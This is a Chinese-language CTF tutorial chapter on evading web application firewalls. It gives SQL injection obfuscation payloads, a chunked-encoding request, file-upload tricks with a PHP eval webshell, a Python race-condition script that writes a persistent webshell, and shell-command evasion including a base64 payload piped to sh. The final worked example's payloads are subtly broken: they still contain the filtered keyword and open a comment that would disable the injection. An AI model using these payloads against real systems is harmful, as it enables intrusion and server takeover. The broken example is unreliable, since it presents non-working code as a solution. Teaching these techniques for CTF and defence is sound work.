---
comments: true
---

# WAF绕过

前面各章（SQL注入、文件上传、RCE 等）讲的都是"怎么打"，本章讲的是"对面有保安时怎么打"。实战中目标几乎都会部署 WAF（Web Application Firewall），CTF 里的中高难度题也常常用一段过滤代码模拟 WAF。本章把前面学过的各类绕过技巧做一次跨漏洞的总集成：你会发现无论注入、上传还是 RCE，绕 WAF 的底层思路是相通的——**WAF 看到的** 和 **后端真正执行的** 之间存在差异，所有绕过技巧都是在利用这个差异。

> 前置阅读：SQL注入、文件上传、RCE 三章；PHP 特有的解析差异可参考「PHP特性与常见绕过」章。

## WAF 工作原理与常见类型

WAF 是架在客户端和 Web 服务器之间的一道过滤器：它按规则（正则、黑名单、语义分析等）检查 HTTP 请求，匹配到攻击特征就拦截。常见类型一句话带过：

- **云 WAF**：流量先经过厂商云端清洗再回源，如阿里云盾、Cloudflare。
- **硬件/软件 WAF**：部署在机房或服务器上的独立设备或软件，如安全狗、ModSecurity。
- **代码级 WAF**：直接写在应用代码里的过滤函数，CTF 题目里最常见的就是这种，例如：

```php
// 典型的 CTF 式"WAF"
if (preg_match('/select|union|sleep|benchmark/i', $_GET['id'])) {
    die('Hacker!');
}
```

代码级 WAF 是本章节的主要假想敌——它的规则完全可见（或可通过探测推断），绕过的本质就是找到一个 **能通过正则、但语义不变的 payload**。

## SQL 注入绕过

假设目标对 `id` 参数做了关键字过滤。以下技巧在「SQL注入」章的基础上解决"语句会被拦"的问题。

### 注释变形

MySQL 的注释不只是注释，还能玩出花：

```sql
-- 内联注释：/*! ... */ 中的内容会被 MySQL 当作正常 SQL 执行，其他数据库则视为注释
id=1 /*!union*/ /*!select*/ 1,2,3

-- 利用版本号条件执行：只有 MySQL 版本 >= 5.00 时才执行其中语句
id=1 union /*!50000select*/ 1,2,3

-- 用注释切割关键字，破坏正则匹配
id=1 un/**/ion sel/**/ect 1,2,3
```

`/*!...*/` 是 MySQL 特有的可执行注释，WAF 规则若只匹配裸关键字 `union`，遇到 `/*!union*/` 就可能漏检；而 MySQL 执行时会把里面的内容正常解析。

### 空白符替代

很多 WAF 只把空格（`%20`）当分隔符。SQL 语法里这些都可以替代空格：

```sql
-- 各种空白符
id=1%09union%09select%091,2,3      -- Tab
id=1%0aunion%0aselect%0a1,2,3      -- 换行
id=1%0cunion%0cselect%0c1,2,3      -- 换页符
id=1%a0union%a0select%a01,2,3      -- 不间断空格

-- 括号天然可以消除空格
id=1 union(select(group_concat(table_name))from(information_schema.tables))

-- 反引号包裹表名、列名时，前后的空格可以省略
id=1 union select 1,`password`,3 from`users`
```

### 等价函数与关键字替换

关键字被过滤时，找同义写法：

| 被过滤 | 替代方案 |
| --- | --- |
| `=` | `like`、`regexp`、`in`、`<>` 配合逻辑 |
| `substr` | `mid`、`left`、`substring` |
| `sleep` | `benchmark(10000000,md5(1))` |
| `if` | `case when ... then ... else ... end` |
| `and` | `&&`、`or` → `\|\|` |
| 逗号 | `union select 1,2,3` → `union select * from (select 1)a join (select 2)b join (select 3)c` |

字符串被过滤时还可以用十六进制或 `char()`：

```sql
-- 'users' 的两种等价写法
select * from users where table_name=0x7573657273;
select * from users where table_name=char(117,115,101,114,115);
```

### 分块传输编码（Chunked）

前面是针对"规则"的绕过，这一条针对的是"流量没进 WAF"。HTTP 支持 `Transfer-Encoding: chunked`，把请求体切成小块传输。部分 WAF 不会重组分块内容就直接放行，而 Web 服务器收到后会正确拼回完整 payload：

```http
POST /inject.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

7
id=1 un
5
ion s
7
elect 1
0

```

请求体被拆成 `id=1 un` + `ion s` + `elect 1` 三块，WAF 逐块检查看不到完整的 `union select`；服务器重组后得到 `id=1 union select 1`。Burp 里可以用插件或手动构造发送，注意每块开头的十六进制长度和最后的 `0\r\n\r\n` 结束标记。

## 文件上传绕过

「文件上传」章讲了各类校验的绕过，这里从"WAF/过滤器视角"再梳理三类最常用的 trick。

### 文件名 tricks

WAF 检查文件名后缀，但解析器和 WAF 对"后缀"的理解未必一致：

```bash
# 大小写（黑名单写死了小写 .php 时）
shell.PHP / shell.pHp

# 双写 / 多重后缀（只替换一次关键字时）
shell.pphphp        # 删掉中间的 php 后仍是 php
shell.php.jpg       # 配合 Apache 多后缀解析

# 截断与特殊字符
shell.php.          # 末尾点：Windows 保存时自动去掉
shell.php%00.jpg    # 00 截断（PHP < 5.3.4）
shell.php::$DATA    # Windows NTFS 流
```

### Content-Type 混淆

校验只检查请求头里的 `Content-Type` 时，改一下就好：

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----abc

------abc
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST['c']); ?>
------abc--
```

文件内容明明是 PHP，把 `Content-Type` 改成 `image/jpeg` 就能骗过只读这个字段的校验。注意这和后文"协议层 Content-Type 混淆"是两回事：这里骗的是 **应用代码**，那里骗的是 **WAF 的解析逻辑**。

### 条件竞争

有些应用先把文件落地到临时目录，校验不通过再删除。只要在"落地"到"删除"的窗口内访问到这个文件，就能让它执行（生成一个不会被删的马）：

```python
import requests, threading

url_up = 'http://target/upload.php'
url_sh = 'http://target/upload/tmp/shell.php'
files = {'file': ('shell.php', "<?php file_put_contents('../sh.php','<?php eval($_POST[c]);?>');?>")}

def keep_upload():
    while True:
        requests.post(url_up, files=files)

def keep_access():
    while True:
        r = requests.get(url_sh)
        if r.status_code == 200:
            print('hit!')

threading.Thread(target=keep_upload).start()
threading.Thread(target=keep_access).start()
```

思路就是两个线程死循环：一个不停上传，一个不停访问。某次访问恰好落在窗口期，`shell.php` 被执行，写出永久马 `sh.php`。

## RCE 绕过

对应「RCE」章，当命令里出现的关键字（`cat`、`flag`、空格等）被过滤时：

### 变量拼接与动态函数

```bash
# shell 变量切割：WAF 看到 a、c、t，bash 执行时是 cat
?cmd=a=c;b=a;c=t;$a$b$c /flag

# 引号/反斜杠切割，shell 会把它们吃掉
?cmd=c'a't /flag
?cmd=c\at /flag

# $* $@ $n ${IFS} 等特殊变量展开为空或空白
?cmd=c$*at /flag
```

```php
// PHP 侧：函数名由变量拼接，黑名单匹配不到完整函数名
$a = 'sys';
$b = 'tem';
($a.$b)('cat /flag');        // system('cat /flag')

// 字符串函数造出被禁关键字
$f = strrev('metsys');
$f('id');                    // system('id')
```

### 通配符

关键字整体被过滤时，用通配符让 shell 自己去匹配：

```bash
?cmd=/???/c?t /flag          # /bin/cat
?cmd=/bin/ca? /f???

# 读文件除了 cat 还有很多"等价函数"
?cmd=tac /flag               # 倒序输出
?cmd=nl /flag
?cmd=more /flag
?cmd=od -c /flag
```

### 编码绕过

```bash
# base64：payload 里完全不出现敏感字
?cmd=`echo Y2F0IC9mbGFn|base64 -d`
?cmd=echo Y2F0IC9mbGFn|base64 -d|sh

# 八进制（printf 解释转义）
?cmd=$(printf "\143\141\164") /flag        # \143\141\164 = cat

# 十六进制
?cmd=$(printf "\x63\x61\x74") /flag
```

「PHP特性与常见绕过」章里讲的异或、取反构造字符串（`$_=('>'>'<')^('>'>'>')` 一类技巧）在这里同样适用，本质都是"让危险关键字不以明文出现在请求里"。

## 通用思路：协议层与 payload 层

把上面的技巧抽象一下，绕 WAF 只有两个维度。

### 协议层：让 WAF 和后端"看到的东西不一样"

WAF 和后端服务对同一个请求的解析可能不同，差异即漏洞：

**Content-Type 混淆。** 很多 WAF 只对特定 `Content-Type` 做深度检测：

```http
POST /search.php HTTP/1.1
Content-Type: application/json

{"id": "1 union select 1,2,3"}
```

后端 PHP 如果用的是 `$_REQUEST`，根本不管 `Content-Type` 是什么；而 WAF 看到 `application/json` 可能切到 JSON 规则，或者干脆不检。反过来把 JSON 请求伪装成 `multipart/form-data` 也常有奇效。

**参数污染（HPP）。** 同名参数传多次，不同组件取值习惯不同：

```http
GET /page.php?id=1&id=union select 1,2,3 HTTP/1.1
```

- Apache/PHP 习惯取 **最后一个**，IIS/ASP 会把多个值 **用逗号拼接**，Tomcat 一般取 **第一个**。
- 如果 WAF 只检查第一个 `id=1` 而 PHP 取第二个，就绕过去了；或者把 payload 拆到两个参数里（`?id=1 uni&id=on select 1,2`），WAF 单独看每个都无害，ASP 拼起来就是完整注入。

分块传输编码（见前文）本质也是协议层技巧。

### Payload 层：让 payload 换个写法但语义不变

前面 SQL、上传、RCE 的所有技巧都属于这一层，归纳成四条：

- **编码**：URL 编码、双重 URL 编码（WAF 解一次、后端再解一次）、Unicode、base64、十六进制。
- **变形**：大小写（`UnIoN`）、注释切割、空白符替换、引号/反斜杠切割。
- **等价替换**：同义函数、通配符、语法糖的另一种写法。
- **拆分**：把一个敏感字符串拆到多处，利用后端的拼接/重组能力还原（HPP、变量拼接都是这个思路）。

做题时的实用流程：先用一个无害特征（如 `union`、`../`、`cat`）逐个试探，确定 WAF 到底拦了什么；再从上面四条里挑对应手段变形；变不出来就换到协议层想"它会不会根本没检到这个参数"。

## 例题：一场针对代码级 WAF 的 SQL 注入

**题目**：`http://target/?id=1`，后端对 `id` 参数有如下过滤，flag 在 `flag` 表的 `flag` 字段里：

```php
$id = $_GET['id'];
if (preg_match('/ |union|select|from|=/i', $id)) {
    die('no no no');
}
$sql = "SELECT name FROM users WHERE id = $id";
```

**解题过程：**

第一步，确定过滤了哪些东西。空格、`union`、`select`、`from`、`=` 都被拦。注意大小写不敏感（`/i`），所以大小写变形这条路死了。

第二步，逐个找替代品：

- 空格 → 用括号消除。`union(select(...))` 不需要空格。
- `union` / `select` / `from` → 用 MySQL 内联注释包裹：`/*!union*/`、`/*!select*/`、`/*!from*/`，正则匹配的是裸关键字，匹配不到。
- `=` → 用 `regexp` 或 `like` 代替。

第三步，拼 payload。先确认列数：

```text
?id=1 /*!union*//*(select(1),(2),(3)*/)
```

括号消除了空格，注释绕过了关键字。页面回显位置确定后，读表：

```text
?id=-1 /*!union*//*(select(1),(flag),(3))/*!from*/(flag)
```

最终执行的 SQL 等价于：

```sql
SELECT name FROM users WHERE id = -1 union select 1,flag,3 from flag
```

如果题目进一步把 `flag` 这个词也过滤了，还可以退到十六进制字符串（`0x666c6167` 只在引号内有效，表名不行）或 `handler` 语句等更冷门的语法——思路不变：**探测规则 → 找等价写法 → 验证语义**。这就是本章开头说的，绕 WAF 不是背 payload，而是找"过滤器眼中的字符串"与"解析器眼中的语义"之间的缝。
